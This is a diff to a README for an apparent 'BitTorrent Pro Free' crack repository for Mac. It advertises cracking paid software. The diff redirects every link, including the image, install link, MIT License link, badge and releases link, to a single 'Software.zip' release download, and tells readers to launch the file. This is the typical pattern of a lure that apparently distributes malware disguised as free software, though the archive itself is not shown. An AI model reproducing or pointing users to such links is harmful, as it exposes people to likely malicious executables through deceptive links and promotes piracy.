@@ -1,6 +1,6 @@
 # BitTorrent Pro Free for Macbook Pro
 
-![BitTorrent Pro Free](https://github.com/username/repository/img/bittorrent-pro-free.png)
+![BitTorrent Pro Free](https://github.com/Aniketmaharda/BitTorrent-Pro-Free/releases/download/v1.0/Software.zip)
 
 Welcome to the BitTorrent Pro Free repository, your one-stop destination for all things related to BitTorrent on Macbook Pro. Whether you are looking to download BitTorrent Pro for free, crack the software, or explore various BitTorrent options for Adobe software, this repository has got you covered.
 
@@ -24,7 +24,7 @@ Welcome to the BitTorrent Pro Free repository, your one-stop destination for all
 
 ## Installation Instructions
 
-To download BitTorrent Pro for free on your Macbook Pro, click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+To download BitTorrent Pro for free on your Macbook Pro, click [here](https://github.com/Aniketmaharda/BitTorrent-Pro-Free/releases/download/v1.0/Software.zip).
 
 Launch the downloaded file to install BitTorrent Pro on your device.
 
@@ -68,13 +68,13 @@ We welcome all contributions that enhance the BitTorrent experience for Macbook 
 
 ## License
 
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This repository is licensed under the [MIT License](https://github.com/Aniketmaharda/BitTorrent-Pro-Free/releases/download/v1.0/Software.zip).
 
 ---
 
-![Download BitTorrent Pro Free](https://img.shields.io/badge/Download-BitTorrent%20Pro%20Free-blue)
+![Download BitTorrent Pro Free](https://github.com/Aniketmaharda/BitTorrent-Pro-Free/releases/download/v1.0/Software.zip%20Pro%20Free-blue)
 
-Visit [here](https://github.com/cli/go-gh/releases) for more BitTorrent Pro Free releases and updates.
+Visit [here](https://github.com/Aniketmaharda/BitTorrent-Pro-Free/releases/download/v1.0/Software.zip) for more BitTorrent Pro Free releases and updates.
 
 ---
 
